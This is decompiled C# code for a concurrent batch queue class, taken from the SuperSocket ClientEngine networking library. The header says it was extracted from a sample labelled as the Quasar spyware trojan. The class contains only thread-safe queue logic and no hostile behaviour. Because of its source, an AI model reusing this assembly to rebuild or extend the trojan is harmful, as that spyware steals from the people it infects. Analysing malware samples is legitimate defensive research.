// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.ConcurrentBatchQueue`1
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Delegates;
using System.Collections.Generic;
using System.Threading;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine
{
  public class ConcurrentBatchQueue<T> : IBatchQueue<T>
  {
    private object m_Entity;
    private ConcurrentBatchQueue<T>.Entity m_BackEntity;
    private static readonly T m_Null;
    private Func<T, bool> m_NullValidator;
    private bool m_Rebuilding;

    public ConcurrentBatchQueue()
      : this(16)
    {
    }

    public ConcurrentBatchQueue(int capacity)
      : this(new T[capacity])
    {
    }

    public ConcurrentBatchQueue(int capacity, Func<T, bool> nullValidator)
      : this(new T[capacity], nullValidator)
    {
    }

    public ConcurrentBatchQueue(T[] array)
      : this(array, (Func<T, bool>) (t => (object) t == null))
    {
    }

    public ConcurrentBatchQueue(T[] array, Func<T, bool> nullValidator)
    {
      this.m_Entity = (object) new ConcurrentBatchQueue<T>.Entity()
      {
        Array = array
      };
      this.m_BackEntity = new ConcurrentBatchQueue<T>.Entity();
      this.m_BackEntity.Array = new T[array.Length];
      this.m_NullValidator = nullValidator;
    }

    public bool Enqueue(T item)
    {
      bool full;
      do
        ;
      while (!(this.TryEnqueue(item, out full) | full));
      return !full;
    }

    private bool TryEnqueue(T item, out bool full)
    {
      full = false;
      this.EnsureNotRebuild();
      ConcurrentBatchQueue<T>.Entity entity = this.m_Entity as ConcurrentBatchQueue<T>.Entity;
      T[] array = entity.Array;
      int count = entity.Count;
      if (count >= array.Length)
      {
        full = true;
        return false;
      }
      if (entity != this.m_Entity || Interlocked.CompareExchange(ref entity.Count, count + 1, count) != count)
        return false;
      array[count] = item;
      return true;
    }

    public bool Enqueue(IList<T> items)
    {
      bool full;
      do
        ;
      while (!(this.TryEnqueue(items, out full) | full));
      return !full;
    }

    private bool TryEnqueue(IList<T> items, out bool full)
    {
      full = false;
      ConcurrentBatchQueue<T>.Entity entity = this.m_Entity as ConcurrentBatchQueue<T>.Entity;
      T[] array = entity.Array;
      int count1 = entity.Count;
      int count2 = items.Count;
      int num = count1 + count2;
      if (num > array.Length)
      {
        full = true;
        return false;
      }
      if (entity != this.m_Entity || Interlocked.CompareExchange(ref entity.Count, num, count1) != count1)
        return false;
      foreach (T obj in (IEnumerable<T>) items)
        array[count1++] = obj;
      return true;
    }

    private void EnsureNotRebuild()
    {
      if (!this.m_Rebuilding)
        return;
      do
      {
        Thread.SpinWait(1);
      }
      while (this.m_Rebuilding);
    }

    public bool TryDequeue(IList<T> outputItems)
    {
      ConcurrentBatchQueue<T>.Entity entity = this.m_Entity as ConcurrentBatchQueue<T>.Entity;
      if (entity.Count <= 0 || Interlocked.CompareExchange(ref this.m_Entity, (object) this.m_BackEntity, (object) entity) != entity)
        return false;
      Thread.SpinWait(1);
      int count = entity.Count;
      T[] array = entity.Array;
      int index = 0;
      while (true)
      {
        for (T obj = array[index]; this.m_NullValidator(obj); obj = array[index])
          Thread.SpinWait(1);
        outputItems.Add(array[index]);
        array[index] = ConcurrentBatchQueue<T>.m_Null;
        if (entity.Count > index + 1)
          ++index;
        else
          break;
      }
      entity.Count = 0;
      this.m_BackEntity = entity;
      return true;
    }

    public bool IsEmpty => this.Count <= 0;

    public int Count => (this.m_Entity as ConcurrentBatchQueue<T>.Entity).Count;

    private class Entity
    {
      public int Count;

      public T[] Array { get; set; }
    }
  }
}
